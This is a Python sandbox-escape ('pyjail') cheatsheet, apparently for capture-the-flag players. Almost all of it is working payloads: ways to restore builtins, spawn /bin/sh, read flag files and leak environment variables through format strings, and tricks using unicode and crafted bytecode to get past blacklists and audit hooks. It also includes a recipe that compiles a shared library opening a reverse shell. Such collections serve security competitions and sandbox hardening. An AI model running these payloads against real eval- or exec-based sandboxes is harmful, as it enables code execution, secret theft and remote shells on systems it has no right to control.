# Pyjail cheatsheet

## Common payloads

### no builtins, inside an interactive shell/multiple exec

```py
# Thanks @Loldemort
del __builtins__
exec(input())
```


### Restore builtins
```py
help.__call__.__builtins__ # or __globals__ -> help.__call__.__globals__["sys"].modules["os"].system("/bin/sh")
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
__build_class__.__self__
__import__.__self__
abs.__self__
aiter.__self__
all.__self__
anext.__self__
any.__self__
ascii.__self__
bin.__self__
breakpoint.__self__
callable.__self__
chr.__self__
compile.__self__
delattr.__self__
dir.__self__
divmod.__self__
eval.__self__
exec.__self__
format.__self__
getattr.__self__
globals.__self__
hasattr.__self__
hash.__self__
hex.__self__
id.__self__
input.__self__
isinstance.__self__
issubclass.__self__
iter.__self__
len.__self__
locals.__self__
max.__self__
min.__self__
next.__self__
oct.__self__
ord.__self__
pow.__self__
print.__self__
repr.__self__
round.__self__
setattr.__self__
sorted.__self__
sum.__self__
vars.__self__

user_defined_function.__builtins__
```

### Spawning a shell

```py
breakpoint()
# import os; os.system("/bin/sh")
```
```py
exec(input())
# import os; os.system("/bin/sh")
```
```py
eval(input())
# __import__("os").system("/bin/sh")
```

### Read a file
```py
help() # then send "print\n:e/flag"
```
```py
# to stderr
exit(set(open("flag")))
exit(*open("flag"))
help(*open("flag")) # this also works with (stdout/stderr) closed 
open(*open("flag"))
compile(".","flag","exec") # flag printed to stderr
```

```py
# to stdout
help(*open("flag")) # this works like a normal print
set(open("flag")) # only works inside an interactive console
print(*open("flag"))
```

### Deleting a variable

```py
# Using try except:

delete_me = ""
try:
    p
except NameError as delete_me:
    pass
print(delete_me) # error
```
```py
# using del

delete_me = ""
del delete_me
print(delete_me) # error
```

## Bypassing common blacklists
### No function calls

```py
@exec
@input
def a():pass # or class a:pass
```

### No function call and no exec/eval

```py
@print
@set
@open
@input
def a():pass # or class a:pass
```

### No function call, no exec/eval, no \n, no spaces, no tabs
```py
@print\r@set\r@open\r@input\rclass\x0ca:pass
```

### No ASCII letters
```py
# I usually use https://lingojam.com/ItalicTextGenerator

𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() # import os;os.system("/bin/sh")

```

Other unicode bypasses: https://peps.python.org/pep-0672/

### no ASCII letters, no underscores, inside eval
```
_＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶𝘵())
```

### no ASCII letters, no double underscores, no builtins, inside eval
```py
()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦("\157\163").𝘴𝘺𝘴𝘵𝘦𝘮("\57\142\151\156\57\163\150")
```

### no ASCII letters, no double underscores, no builtins, no quotes/double quotes inside eval (>= python3.8)
```py
[𝘺:=()._＿𝘥𝘰𝘤＿_, 𝘢:=y[19],()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘺[34]+𝘢).𝘴𝘺𝘴𝘵𝘦𝘮(𝘢+𝘺[56])]
```

### Only imports
```py
from os import system as __getattr__; from __main__ import sh
```

### Other oneliners
```py
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
().__class__.__subclasses__()[19].__repr__.__globals__["_sys"].modules["os"].system("ls")
(1).__class__.__subclasses__()[2].__rand__.__globals__["sys"].modules["os"].system("ls")
[].__class__.__subclasses__()[1].__init__.__builtins__["__import__"]("os").system("ls")
[].__class__.__subclasses__()[1].__hash__.__builtins__["__import__"]("os").system("ls")

# if builtins aren't deleted
import sys;sys.stderr.flush=breakpoint
import sys;sys.stdout.flush=breakpoint
import pdb,builtins as e;e.set=breakpoint;a
import ctypes; import sys; import os; [os.system for os.fspath in [os.system]]; ctypes.cdll[sys.executable]
import os; import sys; [sys for sys.prefix in [sys.executable]]; [sys for os.path.normpath in [os.system]]; import sysconfig

```
### Bypass parsers using comments and encodings
This only works in certain cases:
 - Everything is put into a file and then executed
 - There is something like `exec(data)` where `type(data) == bytes`
```py
# -*- coding: utf_7 -*-
def f(x):
    return x
    #+AAo-print(open("flag.txt").read())
# Thanks @collodel
```

### multiple exec, no dots, no builtins/builtins blacklisted  + other blacklisted words 
```py
# only works if sys is already imported
__builtins__ = sys
__builtins__ = modules
__builtins__ = os
system("cat /flag")
```

### builtins are deleted from everywhere:
https://gist.github.com/CharlesAverill/e7fef5a6e078f14b7ac7b3d318e3e24f?permalink_comment_id=4749794#gistcomment-4749794

### Bypass blacklists using generators

```py
# Way better than (lambda x:x).__globals__
(x for x in ()).gi_frame.f_builtins
(x for x in ()).gi_frame.f_globals
```

### Bypass blacklists using asynchronous functions
```py
async def a():pass
a().cr_frame.f_globals
```

### Other ways to obtain a frame
```py
(sig:=help.__call__.__globals__["sys"].modules["_signal"],sig.signal(2, lambda *x: print(x[1])), sig.raise_signal(2))
```


### No (), inside eval
```py

# _ is a class (eg. `class _:pass`)

def call_function(f, arg):
        return (f"[[None for _.__class_getitem__ in [{f}]],"
                f"_[{arg}]][True]")

# call_function("exec", "'breakpoint()'")
# output: [[None for _.__class_getitem__ in [exec]],_['breakpoint()']][True]

```

### Bypass audit sandboxes
```py

__builtins__.__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat", b'flag.txt'], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__('os').pipe()), False, False, None, None, None, -1, None)

```

### Leak data using format strings
```py
"{0.__self__.help.__call__.__globals__[sys].modules[os].environ}".format(print)
"{a.__self__.help.__call__.__globals__[sys].modules[os].environ}".format_map({"a":print})
"{0.gi_frame.f_builtins[help].__call__.__globals__[sys].modules[os].environ}".format((x for x in ()))
```

### RCE with format strings
```py
# Requirements: file upload/arb write and ctypes loaded

open("/tmp/lib.c", "wb").write(b"""#include <stdlib.h>\n__attribute__((constructor))\nvoid init() {\nsystem("python3 -c \\"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('localhost', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system('/bin/sh')\\"");\n}""")
os.system("gcc -shared -fPIC /tmp/lib.c -o lib.so")

print("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]}".format(user))

```

### OOB Read using LOAD_FAST
```py
# Thanks to @splitline, https://blog.splitline.tw/hitcon-ctf-2022/#v-o-i-d-misc

# This is just an example
(lambda:0).__class__((lambda:0).__code__.replace(co_code=b'|\x17S\x00', co_argcount=0, co_nlocals=0, co_varnames=(
)), {})()["exec"]("import os;os.system('ls')")
```

### Bytecode2RCE exploiting OOB READ with LOAD_FAST

Let's say you have something similar to this (`B01lers CTF - awpcode`):

```py
from types import CodeType
def x():pass
x.__code__ = CodeType(0,0,0,0,0,0,bytes.fromhex(input(">>> ")[:176]),(),(),(),'Δ','♦','✉︎',0,bytes(),bytes(),(),())
a = x()
```

Then, this can be exploited in two different ways:

#### V1
```py
# From https://blog.neilhommes.xyz/docs/Writeups/2024/bctf.html#awpcode---hard

import dis

def assemble(ops):
    cache = bytes([dis.opmap["CACHE"], 0])
    ret = b""
    for op, arg in ops:
        opc = dis.opmap[op]
        ret += bytes([opc, arg])
        ret += cache * dis._inline_cache_entries[opc]
    return ret

co_code = assemble(
    [
        ("RESUME", 0),
        ("LOAD_CONST", 115),
        ("UNPACK_EX", 29),
        ("BUILD_TUPLE", 28),
        ("POP_TOP", 0),
        ("SWAP", 2),
        ("POP_TOP", 0),
        ("LOAD_CONST", 115),
        ("SWAP", 2),
        ("BINARY_SUBSCR", 0),
        ("COPY", 1),
        ("CALL", 0),    # input
        
        ("LOAD_CONST", 115),
        ("UNPACK_EX", 21),
        ("BUILD_TUPLE", 20),
        ("POP_TOP", 0),
        ("SWAP", 2),
        ("POP_TOP", 0),
        ("LOAD_CONST", 115),
        ("SWAP", 2),
        ("BINARY_SUBSCR", 0),
        ("SWAP", 2),
        ("CALL", 0),    # exec
        
        ("RETURN_VALUE", 0),
    ]
)
print(co_code.hex())

```

#### V2
This is only possible if the input is cut before being passed to `bytes.fromhex` (for example)

```py
from pwn import *
from opcode import opmap


co_code = bytes([
                 opmap["KW_NAMES"], 0,
                 opmap["RESUME"], 0,
                 opmap["PUSH_NULL"], 0,
                 opmap["LOAD_FAST"], 82, # exec
                 opmap["LOAD_FAST"], 6, # my input
                 opmap["PRECALL"], 1,
                 opmap["CACHE"],
                 opmap["CACHE"],
                 opmap["CALL"], 1,
                 opmap["CACHE"],
                 opmap["CACHE"],
])


payload = co_code.ljust(176, b"B") # add padding util the input limit is reached
print(payload.hex().encode() + b" if __import__('os').system('cat /*') else 0")

```

### No CALL or LOAD_GLOBAL using LOAD_GLOBAL_BUILTIN and CALL_BUILTIN_CLASS
From [Pycjail returns - ångstromCTF 2024](https://angstromctf.com/)

The idea is to call the breakpoint() function using `LOAD_GLOBAL_BUILTIN` and `CALL_BUILTIN_CLASS`. To avoid causing a segfault when calling breakpoint, we can purposely throw an exception by using, for example, `UNPACK_SEQUENCE_LIST` (using an unknown opcode works too)
```py
from opcode import opmap

code = bytes([
    111, 1, # LOAD_GLOBAL_BUILTIN
    6,6,6,6,6,6,6,6, # trash
    29, 0, # CALL_BUILTIN_CLASS
    6,6,6,6,6,6, # other trash
    191,0 # unknown opcode -> error
])


print(code.hex())
```
### Other useful things
```py
user_defined_function.__closure__
user_defined_class.__reduce_ex__(user_defined_class(), n)
pdb.set_trace() # works also if __builtins__ is empty
```

# Credits
 - https://shirajuki.js.org/blog/pyjail-cheatsheet
 - https://jbnrz.com.cn/index.php/2024/05/19/pyjail/
